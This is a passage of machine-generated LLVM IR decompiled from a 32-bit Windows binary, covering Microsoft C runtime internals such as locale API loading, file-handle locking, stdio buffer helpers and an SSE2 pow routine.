define i32 @___acrt_eagerly_load_locale_apis() local_unnamed_addr {
dec_label_pc_10020f6a:
  %0 = call i32 @"?try_get_AreFileApisANSI@@YAP6GHXZXZ"(), !insn.addr !9626
  %1 = call i32 @"?try_get_CompareStringEx@@YAP6GHPB_WK0H0HPAU_nlsversioninfo@@PAXJ@ZXZ"(), !insn.addr !9627
  %2 = call i32 @"?try_get_EnumSystemLocalesEx@@YAP6GHP6GHPA_WKJ@ZKJPAX@ZXZ"(), !insn.addr !9628
  %3 = call i32 @"?try_get_GetDateFormatEx@@YAP6GHPB_WKPBU_SYSTEMTIME@@0PA_WH0@ZXZ"(), !insn.addr !9629
  %4 = call i32 @"?try_get_GetLocaleInfoEx@@YAP6GHPB_WKPA_WH@ZXZ"(), !insn.addr !9630
  %5 = call i32 @"?try_get_GetTimeFormatEx@@YAP6GHPB_WKPBU_SYSTEMTIME@@0PA_WH@ZXZ"(), !insn.addr !9631
  %6 = call i32 @"?try_get_GetUserDefaultLocaleName@@YAP6GHPA_WH@ZXZ"(), !insn.addr !9632
  %7 = call i32 @"?try_get_IsValidLocaleName@@YAP6GHPB_W@ZXZ"(), !insn.addr !9633
  %8 = call i32 @"?try_get_LCMapStringEx@@YAP6GHPB_WK0HPA_WHPAU_nlsversioninfo@@PAXJ@ZXZ"(), !insn.addr !9634
  %9 = call i32 @"?try_get_LCIDToLocaleName@@YAP6GHKPA_WHK@ZXZ"(), !insn.addr !9635
  %10 = call i32 @"?try_get_LocaleNameToLCID@@YAP6GKPB_WK@ZXZ"(), !insn.addr !9636
  ret i32 %10, !insn.addr !9636
}

define i32 @function_10021094() local_unnamed_addr {
dec_label_pc_10021094:
  %0 = call i32 @___acrt_unlock(i32 8), !insn.addr !9637
  ret i32 %0, !insn.addr !9638
}

define i32 @function_1002109d(i32* %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1002109d:
  %esi.0.reg2mem = alloca i32, !insn.addr !9639
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003bc08, i32 12), !insn.addr !9640
  %2 = add i32 %0, -28, !insn.addr !9641
  %3 = inttoptr i32 %2 to i32*, !insn.addr !9641
  store i32 0, i32* %3, align 4, !insn.addr !9641
  %4 = add i32 %0, 8, !insn.addr !9642
  %5 = inttoptr i32 %4 to i32*, !insn.addr !9642
  %6 = load i32, i32* %5, align 4, !insn.addr !9642
  %7 = inttoptr i32 %6 to i32*, !insn.addr !9643
  %8 = load i32, i32* %7, align 4, !insn.addr !9643
  %9 = call i32 @___acrt_lowio_lock_fh(i32 %8), !insn.addr !9644
  %10 = add i32 %0, -4, !insn.addr !9645
  %11 = inttoptr i32 %10 to i32*, !insn.addr !9645
  store i32 0, i32* %11, align 4, !insn.addr !9645
  %12 = add i32 %0, 12, !insn.addr !9646
  %13 = inttoptr i32 %12 to i32*, !insn.addr !9646
  %14 = load i32, i32* %13, align 4, !insn.addr !9646
  %15 = inttoptr i32 %14 to i32*, !insn.addr !9647
  %16 = load i32, i32* %15, align 4, !insn.addr !9647
  %17 = inttoptr i32 %16 to i32*, !insn.addr !9648
  %18 = load i32, i32* %17, align 4, !insn.addr !9648
  %19 = sdiv i32 %18, 64, !insn.addr !9649
  %20 = and i32 %18, 63, !insn.addr !9650
  %narrow = mul nuw nsw i32 %20, 48
  %21 = mul i32 %19, 4, !insn.addr !9651
  %22 = add i32 %21, ptrtoint (i32* @global_var_1003e8e8 to i32), !insn.addr !9651
  %23 = inttoptr i32 %22 to i32*, !insn.addr !9651
  %24 = load i32, i32* %23, align 4, !insn.addr !9651
  %25 = add i32 %24, 40, !insn.addr !9652
  %26 = add i32 %25, %narrow, !insn.addr !9652
  %27 = inttoptr i32 %26 to i8*, !insn.addr !9652
  %28 = load i8, i8* %27, align 1, !insn.addr !9652
  %29 = and i8 %28, 1, !insn.addr !9652
  %30 = icmp eq i8 %29, 0, !insn.addr !9652
  br i1 %30, label %dec_label_pc_100210ff, label %dec_label_pc_100210de, !insn.addr !9653

dec_label_pc_100210de:                            ; preds = %dec_label_pc_1002109d
  %31 = call i32 @__get_osfhandle(i32 %18), !insn.addr !9654
  %32 = inttoptr i32 %31 to i32*, !insn.addr !9655
  %33 = call i1 @FlushFileBuffers(i32* %32), !insn.addr !9655
  %34 = icmp eq i1 %33, false, !insn.addr !9656
  %35 = icmp eq i1 %34, false, !insn.addr !9657
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !9657
  br i1 %35, label %dec_label_pc_1002110d, label %dec_label_pc_100210f0, !insn.addr !9657

dec_label_pc_100210f0:                            ; preds = %dec_label_pc_100210de
  %36 = call i32 @___doserrno(), !insn.addr !9658
  %37 = call i32 @GetLastError(), !insn.addr !9659
  %38 = inttoptr i32 %36 to i32*, !insn.addr !9660
  store i32 %37, i32* %38, align 4, !insn.addr !9660
  br label %dec_label_pc_100210ff, !insn.addr !9660

dec_label_pc_100210ff:                            ; preds = %dec_label_pc_100210f0, %dec_label_pc_1002109d
  %39 = call i32* @__errno(), !insn.addr !9661
  store i32 9, i32* %39, align 4, !insn.addr !9662
  store i32 -1, i32* %esi.0.reg2mem, !insn.addr !9663
  br label %dec_label_pc_1002110d, !insn.addr !9663

dec_label_pc_1002110d:                            ; preds = %dec_label_pc_100210ff, %dec_label_pc_100210de
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  store i32 %esi.0.reload, i32* %3, align 4, !insn.addr !9664
  store i32 -2, i32* %11, align 4, !insn.addr !9665
  %40 = call i32 @function_10021129(), !insn.addr !9666
  %41 = call i32 @__SEH_epilog4(), !insn.addr !9667
  ret i32 %41, !insn.addr !9668
}

define i32 @function_10021129() local_unnamed_addr {
dec_label_pc_10021129:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !9669
  %2 = inttoptr i32 %1 to i32*, !insn.addr !9669
  %3 = load i32, i32* %2, align 4, !insn.addr !9669
  %4 = inttoptr i32 %3 to i32*, !insn.addr !9670
  %5 = load i32, i32* %4, align 4, !insn.addr !9670
  %6 = call i32 @___acrt_lowio_unlock_fh(i32 %5), !insn.addr !9671
  ret i32 %6, !insn.addr !9672
}

define i32 @"??$__acrt_lowio_lock_fh_and_call@V<lambda_38ce7e780aa69e748d6df282ebc68efe>@@@@YAHH$$QAV<lambda_38ce7e780aa69e748d6df282ebc68efe>@@@Z"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10021135:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = ptrtoint i32* %arg2 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4, !insn.addr !9673
  store i32 %arg1, i32* %stack_var_-16, align 4, !insn.addr !9674
  %2 = call i32 @function_1002109d(i32* nonnull %stack_var_-16, i32 %1, i32* nonnull %stack_var_-12, i32 %arg1, i32 %arg1, i32 %0), !insn.addr !9675
  ret i32 %2, !insn.addr !9676
}

define i32 @function_10021830() local_unnamed_addr {
dec_label_pc_10021830:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @___acrt_lowio_unlock_fh(i32 %0), !insn.addr !9677
  ret i32 %1, !insn.addr !9678
}

declare i32 @"??$common_refill_and_read_nolock@D@@YAHV__crt_stdio_stream@@@Z"(i32) local_unnamed_addr

define i32 @___acrt_stdio_refill_and_read_narrow_nolock() local_unnamed_addr {
dec_label_pc_10021bf5:
  %0 = call i32 @"??$common_refill_and_read_nolock@D@@YAHV__crt_stdio_stream@@@Z"(i32 ptrtoint (i32* @1 to i32)), !insn.addr !9679
  ret i32 %0, !insn.addr !9679
}

declare i32 @"??$common_flush_and_write_nolock@D@@YAHHV__crt_stdio_stream@@@Z"(i32, i32) local_unnamed_addr

define i32 @___acrt_stdio_flush_and_write_narrow_nolock() local_unnamed_addr {
dec_label_pc_10021ddd:
  %0 = call i32 @"??$common_flush_and_write_nolock@D@@YAHHV__crt_stdio_stream@@@Z"(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !9680
  ret i32 %0, !insn.addr !9680
}

declare i32 @__wcstombs_s_l(i32*, i32, i32, i32, i32, i32*) local_unnamed_addr

define i32 @__query_new_mode() local_unnamed_addr {
dec_label_pc_10022193:
  %0 = load i32, i32* @global_var_1003ebdc, align 4, !insn.addr !9681
  ret i32 %0, !insn.addr !9682
}

define i32 @function_100221aa() local_unnamed_addr {
dec_label_pc_100221aa:
  %0 = call i32 @__decompiler_undefined_function_1()
  store i32 0, i32* @global_var_1003ebe0, align 4, !insn.addr !9683
  %1 = and i32 %0, -256, !insn.addr !9684
  %2 = or i32 %1, 1, !insn.addr !9684
  ret i32 %2, !insn.addr !9685
}

define i32 @function_100228b8(i32* %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_100228b8:
  %storemerge.reg2mem = alloca i32, !insn.addr !9686
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003bc68, i32 12), !insn.addr !9687
  %2 = add i32 %0, -28, !insn.addr !9688
  %3 = inttoptr i32 %2 to i32*, !insn.addr !9688
  store i32 0, i32* %3, align 4, !insn.addr !9688
  %4 = add i32 %0, 8, !insn.addr !9689
  %5 = inttoptr i32 %4 to i32*, !insn.addr !9689
  %6 = load i32, i32* %5, align 4, !insn.addr !9689
  %7 = inttoptr i32 %6 to i32*, !insn.addr !9690
  %8 = load i32, i32* %7, align 4, !insn.addr !9690
  %9 = call i32 @___acrt_lock(i32 %8), !insn.addr !9691
  %10 = add i32 %0, -4, !insn.addr !9692
  %11 = inttoptr i32 %10 to i32*, !insn.addr !9692
  store i32 0, i32* %11, align 4, !insn.addr !9692
  %12 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !9693
  %13 = and i32 %12, 31, !insn.addr !9694
  %14 = load i32, i32* @global_var_1003ebec, align 4, !insn.addr !9695
  %15 = xor i32 %14, %12, !insn.addr !9695
  %16 = icmp eq i32 %13, 0, !insn.addr !9696
  store i32 %15, i32* %storemerge.reg2mem, !insn.addr !9696
  br i1 %16, label %22, label %17, !insn.addr !9696

; <label>:17:                                     ; preds = %dec_label_pc_100228b8
  %18 = lshr i32 %15, %13, !insn.addr !9696
  %19 = sub nsw i32 32, %13, !insn.addr !9696
  %20 = shl i32 %15, %19, !insn.addr !9696
  %21 = or i32 %18, %20, !insn.addr !9696
  store i32 %21, i32* %storemerge.reg2mem, !insn.addr !9696
  br label %22, !insn.addr !9696

; <label>:22:                                     ; preds = %dec_label_pc_100228b8, %17
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  store i32 %storemerge.reload, i32* %3, align 4, !insn.addr !9697
  store i32 -2, i32* %11, align 4, !insn.addr !9698
  %23 = call i32 @function_10022906(), !insn.addr !9699
  %24 = call i32 @__SEH_epilog4(), !insn.addr !9700
  ret i32 %24, !insn.addr !9701
}

define i32 @function_10022906() local_unnamed_addr {
dec_label_pc_10022906:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !9702
  %2 = inttoptr i32 %1 to i32*, !insn.addr !9702
  %3 = load i32, i32* %2, align 4, !insn.addr !9702
  %4 = inttoptr i32 %3 to i32*, !insn.addr !9703
  %5 = load i32, i32* %4, align 4, !insn.addr !9703
  %6 = call i32 @___acrt_unlock(i32 %5), !insn.addr !9704
  ret i32 %6, !insn.addr !9705
}

define void (i32)* @"??$__acrt_lock_and_call@V<lambda_44731a7d0e6d81c3e6aa82d741081786>@@@@YAP6AXH@ZW4__acrt_lock_id@@$$QAV<lambda_44731a7d0e6d81c3e6aa82d741081786>@@@Z"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10022912:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = ptrtoint i32* %arg2 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4, !insn.addr !9706
  store i32 %arg1, i32* %stack_var_-16, align 4, !insn.addr !9707
  %2 = call i32 @function_100228b8(i32* nonnull %stack_var_-16, i32 %1, i32* nonnull %stack_var_-12, i32 %arg1, i32 %arg1, i32 %0), !insn.addr !9708
  %3 = inttoptr i32 %2 to void (i32)*, !insn.addr !9709
  ret void (i32)* %3, !insn.addr !9709
}

define i32 @___fpecode() local_unnamed_addr {
dec_label_pc_100229f6:
  %0 = call i32 @___acrt_getptd(), !insn.addr !9710
  %1 = add i32 %0, 8, !insn.addr !9711
  ret i32 %1, !insn.addr !9712
}

define i32 @function_10022bbf() local_unnamed_addr {
dec_label_pc_10022bbf:
  %eax.0.reg2mem = alloca i32, !insn.addr !9713
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, -29, !insn.addr !9713
  %2 = inttoptr i32 %1 to i8*, !insn.addr !9713
  %3 = load i8, i8* %2, align 1, !insn.addr !9713
  %4 = icmp eq i8 %3, 0, !insn.addr !9713
  br i1 %4, label %dec_label_pc_10022bcd, label %dec_label_pc_10022bc5, !insn.addr !9714

dec_label_pc_10022bc5:                            ; preds = %dec_label_pc_10022bbf
  %5 = call i32 @___acrt_unlock(i32 3), !insn.addr !9715
  store i32 %5, i32* %eax.0.reg2mem, !insn.addr !9716
  br label %dec_label_pc_10022bcd, !insn.addr !9716

dec_label_pc_10022bcd:                            ; preds = %dec_label_pc_10022bc5, %dec_label_pc_10022bbf
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !9717
}

define i32 @function_10022bce() local_unnamed_addr {
dec_label_pc_10022bce:
  %0 = call i32 @function_10004670(), !insn.addr !9718
  ret i32 %0, !insn.addr !9719
}

define i32 @function_10022bdb(i32 %arg1) local_unnamed_addr {
dec_label_pc_10022bdb:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = call i32 @__decompiler_undefined_function_1()
  %4 = icmp eq i32 %1, %0, !insn.addr !9720
  %5 = icmp eq i32 %1, 11, !insn.addr !9721
  %or.cond = or i1 %4, %5
  %or.cond.not = icmp ne i1 %or.cond, true
  %6 = icmp eq i32 %1, 4, !insn.addr !9722
  %7 = icmp eq i1 %6, false, !insn.addr !9723
  %or.cond3 = icmp eq i1 %7, %or.cond.not
  br i1 %or.cond3, label %8, label %dec_label_pc_10022bea, !insn.addr !9724

; <label>:8:                                      ; preds = %dec_label_pc_10022bdb
  %9 = call i32 @function_10022bff(), !insn.addr !9723
  br label %dec_label_pc_10022bea, !insn.addr !9723

dec_label_pc_10022bea:                            ; preds = %dec_label_pc_10022bdb, %8
  %10 = add i32 %2, -52, !insn.addr !9725
  %11 = inttoptr i32 %10 to i32*, !insn.addr !9725
  %12 = load i32, i32* %11, align 4, !insn.addr !9725
  %13 = add i32 %3, 4, !insn.addr !9726
  %14 = inttoptr i32 %13 to i32*, !insn.addr !9726
  store i32 %12, i32* %14, align 4, !insn.addr !9726
  %15 = icmp eq i1 %4, false, !insn.addr !9727
  br i1 %15, label %16, label %dec_label_pc_10022bf4, !insn.addr !9727

; <label>:16:                                     ; preds = %dec_label_pc_10022bea
  %17 = call i32 @function_10022bff(), !insn.addr !9727
  br label %dec_label_pc_10022bf4, !insn.addr !9727

dec_label_pc_10022bf4:                            ; preds = %16, %dec_label_pc_10022bea
  %18 = call i32 @___acrt_getptd(), !insn.addr !9728
  %19 = add i32 %2, -56, !insn.addr !9729
  %20 = inttoptr i32 %19 to i32*, !insn.addr !9729
  %21 = load i32, i32* %20, align 4, !insn.addr !9729
  %22 = add i32 %18, 8, !insn.addr !9730
  %23 = inttoptr i32 %22 to i32*, !insn.addr !9730
  store i32 %21, i32* %23, align 4, !insn.addr !9730
  ret i32 %18, !insn.addr !9730
}

define i32 @function_10022bff() local_unnamed_addr {
dec_label_pc_10022bff:
  ret i32 0, !insn.addr !9731
}

define i32 @function_10022d0a() local_unnamed_addr {
dec_label_pc_10022d0a:
  %0 = call i1 @IsProcessorFeaturePresent(i32 10), !insn.addr !9732
  %1 = sext i1 %0 to i32, !insn.addr !9732
  store i32 %1, i32* @global_var_10040a64, align 4, !insn.addr !9733
  ret i32 0, !insn.addr !9734
}

define x86_fp80 @__pow_pentium4(i64 %arg1, i64 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10022d39:
  %xmm0.6.reg2mem = alloca i128, !insn.addr !9735
  %xmm0.5.reg2mem = alloca i128, !insn.addr !9735
  %storemerge.reg2mem = alloca i32, !insn.addr !9735
  %storemerge2.in.reg2mem = alloca i32, !insn.addr !9735
  %ecx.5.reg2mem = alloca i32, !insn.addr !9735
  %esp.0.reg2mem = alloca i32, !insn.addr !9735
  %edx.2.reg2mem = alloca i32, !insn.addr !9735
  %xmm0.4.reg2mem = alloca i128, !insn.addr !9735
  %edx.1.reg2mem = alloca i32, !insn.addr !9735
  %ecx.4.reg2mem = alloca i32, !insn.addr !9735
  %xmm4.5.reg2mem = alloca i128, !insn.addr !9735
  %xmm3.4.reg2mem = alloca i128, !insn.addr !9735
  %xmm2.4.reg2mem = alloca i128, !insn.addr !9735
  %xmm1.3.reg2mem = alloca i128, !insn.addr !9735
  %xmm0.3.reg2mem = alloca i128, !insn.addr !9735
  %.reg2mem = alloca i64, !insn.addr !9735
  %xmm4.4.reg2mem = alloca i128, !insn.addr !9735
  %xmm1.2.reg2mem = alloca i128, !insn.addr !9735
  %merge.reg2mem = alloca x86_fp80, !insn.addr !9735
  %xmm1.19.reg2mem = alloca i128, !insn.addr !9735
  %xmm2.310.reg2mem = alloca i128, !insn.addr !9735
  %eax.011.reg2mem = alloca i32, !insn.addr !9735
  %ecx.312.reg2mem = alloca i32, !insn.addr !9735
  %ecx.1.reg2mem = alloca i32, !insn.addr !9735
  %xmm3.1.reg2mem = alloca i128, !insn.addr !9735
  %xmm2.1.reg2mem = alloca i128, !insn.addr !9735
  %xmm1.0.reg2mem = alloca i128, !insn.addr !9735
  %xmm4.1.reg2mem = alloca i128, !insn.addr !9735
  %edx.0.reg2mem = alloca i32, !insn.addr !9735
  %ecx.0.reg2mem = alloca i32, !insn.addr !9735
  %xmm7.0.reg2mem = alloca i128, !insn.addr !9735
  %xmm6.0.reg2mem = alloca i128, !insn.addr !9735
  %xmm5.0.reg2mem = alloca i128, !insn.addr !9735
  %xmm4.0.reg2mem = alloca i128, !insn.addr !9735
  %xmm3.0.reg2mem = alloca i128, !insn.addr !9735
  %xmm2.0.reg2mem = alloca i128, !insn.addr !9735
  %xmm0.0.reg2mem = alloca i128, !insn.addr !9735
  %0 = call i128 @__decompiler_undefined_function_3()
  %1 = call i128 @__decompiler_undefined_function_3()
  %2 = call i128 @__decompiler_undefined_function_3()
  %3 = call i128 @__decompiler_undefined_function_3()
  %4 = call i128 @__decompiler_undefined_function_3()
  %5 = call i128 @__decompiler_undefined_function_3()
  %6 = call i128 @__decompiler_undefined_function_3()
  %stack_var_0 = alloca i32, align 4
  %7 = call double @__decompiler_undefined_function_12()
  %8 = call i128 @__asm_movlpd.38(i128 %6, i64 %arg1), !insn.addr !9735
  %9 = load i64, i64* bitcast (i128* @global_var_10033170 to i64*), align 4, !insn.addr !9736
  %10 = call i128 @__asm_movlpd.38(i128 %0, i64 %9), !insn.addr !9736
  %11 = load i64, i64* bitcast (i128* @global_var_10033180 to i64*), align 4, !insn.addr !9737
  %12 = call i128 @__asm_movlpd.38(i128 %4, i64 %11), !insn.addr !9737
  %13 = call i128 @__asm_andpd(i128 %10, i128 %8), !insn.addr !9738
  %14 = call i128 @__asm_movsd(i128 %2, i128 %8), !insn.addr !9739
  %15 = call i128 @__asm_psrlq(i128 %8, i32 44), !insn.addr !9740
  %16 = call i32 @__asm_pextrw(i128 %15, i32 0), !insn.addr !9741
  %17 = call i128 @__asm_orpd(i128 %13, i128 %12), !insn.addr !9742
  %18 = call i32 @__asm_pextrw(i128 %14, i32 3), !insn.addr !9743
  %19 = and i32 %16, 255, !insn.addr !9744
  %20 = add nuw nsw i32 %19, 1, !insn.addr !9745
  %21 = and i32 %20, 510, !insn.addr !9746
  %22 = mul i32 %21, 4, !insn.addr !9747
  %23 = add i32 %22, ptrtoint (i64** @global_var_10034f38 to i32), !insn.addr !9747
  %24 = inttoptr i32 %23 to i64*, !insn.addr !9747
  %25 = load i64, i64* %24, align 4, !insn.addr !9747
  %26 = call i128 @__asm_mulsd.39(i128 %17, i64 %25), !insn.addr !9747
  %27 = load i64, i64* %24, align 4, !insn.addr !9748
  %28 = call i128 @__asm_movlpd.38(i128 %1, i64 %27), !insn.addr !9748
  %29 = mul i32 %21, 8, !insn.addr !9749
  %30 = add i32 %29, ptrtoint (i128** @global_var_10035350 to i32), !insn.addr !9749
  %31 = inttoptr i32 %30 to i128*, !insn.addr !9749
  %32 = load i128, i128* %31, align 4, !insn.addr !9749
  %33 = call i128 @__asm_movapd(i128 %32), !insn.addr !9749
  %34 = sub i32 32751, %18, !insn.addr !9750
  %35 = add i32 %18, -16, !insn.addr !9751
  %36 = or i32 %35, %34, !insn.addr !9752
  %37 = icmp sgt i32 %36, -1, !insn.addr !9753
  %38 = icmp eq i1 %37, false, !insn.addr !9754
  store i128 %15, i128* %xmm0.0.reg2mem, !insn.addr !9754
  store i128 %12, i128* %xmm2.0.reg2mem, !insn.addr !9754
  store i128 %14, i128* %xmm4.0.reg2mem, !insn.addr !9754
  store i128 %28, i128* %xmm5.0.reg2mem, !insn.addr !9754
  store i128 %33, i128* %xmm6.0.reg2mem, !insn.addr !9754
  store i128 %26, i128* %xmm7.0.reg2mem, !insn.addr !9754
  store i32 0, i32* %ecx.0.reg2mem, !insn.addr !9754
  store i32 261759, i32* %edx.0.reg2mem, !insn.addr !9754
  br i1 %38, label %dec_label_pc_10023087, label %dec_label_pc_10022db6, !insn.addr !9754

dec_label_pc_10022db6:                            ; preds = %dec_label_pc_10022d39, %dec_label_pc_10023208, %dec_label_pc_10023176
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %xmm7.0.reload = load i128, i128* %xmm7.0.reg2mem
  %xmm6.0.reload = load i128, i128* %xmm6.0.reg2mem
  %xmm5.0.reload = load i128, i128* %xmm5.0.reg2mem
  %xmm4.0.reload = load i128, i128* %xmm4.0.reg2mem
  %xmm3.0.reload = load i128, i128* %xmm3.0.reg2mem
  %xmm2.0.reload = load i128, i128* %xmm2.0.reg2mem
  %xmm0.0.reload = load i128, i128* %xmm0.0.reg2mem
  %39 = call i128 @__asm_movd(i32 %edx.0.reload), !insn.addr !9755
  %40 = call i128 @__asm_psubq(i128 %xmm0.0.reload, i128 %39), !insn.addr !9756
  %41 = call i128 @__asm_psrlq(i128 %40, i32 8), !insn.addr !9757
  %42 = call i128 @__asm_cvtdq2pd(i128 %41), !insn.addr !9758
  %43 = call i128 @__asm_movlpd.38(i128 %39, i64 -134217728), !insn.addr !9759
  %44 = call i128 @__asm_movsd(i128 %xmm3.0.reload, i128 %xmm7.0.reload), !insn.addr !9760
  %45 = call i128 @__asm_psrlq(i128 %xmm7.0.reload, i32 38), !insn.addr !9761
  %46 = call i32 @__asm_pextrw(i128 %45, i32 0), !insn.addr !9762
  %47 = load i128, i128* @global_var_10033170, align 4, !insn.addr !9763
  %48 = call i128 @__asm_andpd(i128 %xmm4.0.reload, i128 %47), !insn.addr !9763
  %49 = and i32 %46, 255, !insn.addr !9764
  %50 = add nuw nsw i32 %49, 1, !insn.addr !9765
  %51 = and i32 %50, 510, !insn.addr !9766
  %52 = mul i32 %51, 4, !insn.addr !9767
  %53 = add i32 %52, ptrtoint (i64** @global_var_10035b60 to i32), !insn.addr !9767
  %54 = inttoptr i32 %53 to i64*, !insn.addr !9767
  %55 = load i64, i64* %54, align 4, !insn.addr !9767
  %56 = call i128 @__asm_mulsd.39(i128 %44, i64 %55), !insn.addr !9767
  %57 = load i64, i64* %54, align 4, !insn.addr !9768
  %58 = call i128 @__asm_mulsd.39(i128 %xmm5.0.reload, i64 %57), !insn.addr !9768
  %59 = mul i32 %51, 8, !insn.addr !9769
  %60 = add i32 %59, ptrtoint (i128** @global_var_10035f70 to i32), !insn.addr !9769
  %61 = inttoptr i32 %60 to i128*, !insn.addr !9769
  %62 = load i128, i128* %61, align 4, !insn.addr !9769
  %63 = call i128 @__asm_addpd(i128 %xmm6.0.reload, i128 %62), !insn.addr !9769
  %64 = load i128, i128* @global_var_10033180, align 4, !insn.addr !9770
  %65 = call i128 @__asm_orpd(i128 %48, i128 %64), !insn.addr !9770
  %66 = call i128 @__asm_addsd(i128 %63, i128 %42), !insn.addr !9771
  %67 = call i128 @__asm_andpd(i128 %43, i128 %65), !insn.addr !9772
  %68 = call i128 @__asm_movsd(i128 %xmm2.0.reload, i128 %56), !insn.addr !9773
  %69 = call i128 @__asm_psrlq(i128 %56, i32 31), !insn.addr !9774
  %70 = call i32 @__asm_pextrw(i128 %69, i32 0), !insn.addr !9775
  %71 = call i128 @__asm_movlpd.38(i128 %42, i64 -134217728), !insn.addr !9776
  %72 = call i128 @__asm_subsd(i128 %65, i128 %67), !insn.addr !9777
  %73 = call i128 @__asm_movlpd.38(i128 %45, i64 -4614195897457180672), !insn.addr !9778
  %74 = and i32 %70, 511, !insn.addr !9779
  %75 = add nuw nsw i32 %74, 1, !insn.addr !9780
  %76 = and i32 %75, 1022, !insn.addr !9781
  %77 = mul i32 %76, 4, !insn.addr !9782
  %78 = add i32 %77, ptrtoint (i64** @global_var_10036780 to i32), !insn.addr !9782
  %79 = inttoptr i32 %78 to i64*, !insn.addr !9782
  %80 = load i64, i64* %79, align 4, !insn.addr !9782
  %81 = call i128 @__asm_mulsd.39(i128 %58, i64 %80), !insn.addr !9782
  %82 = load i64, i64* %79, align 4, !insn.addr !9783
  %83 = call i128 @__asm_mulsd.39(i128 %68, i64 %82), !insn.addr !9783
  %84 = mul i32 %76, 8, !insn.addr !9784
  %85 = add i32 %84, ptrtoint (i128** @global_var_10036f90 to i32), !insn.addr !9784
  %86 = inttoptr i32 %85 to i128*, !insn.addr !9784
  %87 = load i128, i128* %86, align 4, !insn.addr !9784
  %88 = call i128 @__asm_addpd(i128 %66, i128 %87), !insn.addr !9784
  %89 = call i128 @__asm_andpd(i128 %71, i128 %81), !insn.addr !9785
  %90 = call i128 @__asm_subsd(i128 %81, i128 %89), !insn.addr !9786
  %91 = call i128 @__asm_addsd(i128 %73, i128 %83), !insn.addr !9787
  %92 = call i128 @__asm_movsd(i128 %69, i128 %89), !insn.addr !9788
  %93 = call i128 @__asm_mulsd(i128 %89, i128 %67), !insn.addr !9789
  %94 = call i128 @__asm_mulsd(i128 %67, i128 %90), !insn.addr !9790
  %95 = call i128 @__asm_mulsd(i128 %92, i128 %72), !insn.addr !9791
  %96 = call i128 @__asm_subsd(i128 %83, i128 %93), !insn.addr !9792
  %97 = call i128 @__asm_mulsd(i128 %72, i128 %90), !insn.addr !9793
  %98 = call i128 @__asm_movsd(i128 %93, i128 %88), !insn.addr !9794
  %99 = call i128 @__asm_subsd(i128 %96, i128 %94), !insn.addr !9795
  %100 = call i128 @__asm_addsd(i128 %88, i128 %91), !insn.addr !9796
  %101 = call i128 @__asm_movlpd.38(i128 %94, i64 %arg2), !insn.addr !9797
  %102 = call i32 @__asm_pextrw(i128 %101, i32 3), !insn.addr !9798
  %103 = call i128 @__asm_subsd(i128 %99, i128 %95), !insn.addr !9799
  %104 = call i128 @__asm_subsd(i128 %98, i128 %100), !insn.addr !9800
  %105 = call i128 @__asm_movlpd.38(i128 %95, i64 -134217728), !insn.addr !9801
  %106 = call i32 @__asm_pextrw(i128 %100, i32 3), !insn.addr !9802
  %107 = call i128 @__asm_subsd(i128 %103, i128 %97), !insn.addr !9803
  %108 = call i128 @__asm_movsd(i128 %97, i128 %100), !insn.addr !9804
  %109 = call i128 @__asm_addsd(i128 %104, i128 %91), !insn.addr !9805
  %110 = call i128 @__asm_subsd(i128 %91, i128 %107), !insn.addr !9806
  %111 = call i128 @__asm_subsd(i128 %100, i128 %107), !insn.addr !9807
  %112 = call i128 @__asm_unpcklpd(i128 %110, i128 %110), !insn.addr !9808
  %113 = and i32 %102, 32752, !insn.addr !9809
  %114 = icmp ne i32 %113, 32752, !insn.addr !9810
  %115 = icmp eq i1 %114, false, !insn.addr !9811
  br i1 %115, label %dec_label_pc_100233f8, label %dec_label_pc_10022ee1, !insn.addr !9811

dec_label_pc_10022ee1:                            ; preds = %dec_label_pc_10022db6
  %116 = and i32 %106, 32752, !insn.addr !9812
  %117 = add nsw i32 %113, -16368, !insn.addr !9813
  %118 = add nsw i32 %117, %116, !insn.addr !9814
  %119 = sub nsw i32 16544, %118, !insn.addr !9815
  %120 = add nsw i32 %118, -15472, !insn.addr !9816
  %121 = or i32 %119, %120, !insn.addr !9817
  %122 = icmp sgt i32 %121, -1, !insn.addr !9818
  %123 = icmp eq i1 %122, false, !insn.addr !9819
  store i128 %108, i128* %xmm4.1.reg2mem, !insn.addr !9819
  br i1 %123, label %dec_label_pc_100237ba, label %dec_label_pc_10022f08, !insn.addr !9819

dec_label_pc_10022f08:                            ; preds = %dec_label_pc_100237ba, %dec_label_pc_10022ee1
  %xmm4.1.reload = load i128, i128* %xmm4.1.reg2mem
  %124 = call i128 @__asm_subsd(i128 %xmm4.1.reload, i128 %111), !insn.addr !9820
  %125 = call i128 @__asm_subsd(i128 %107, i128 %124), !insn.addr !9821
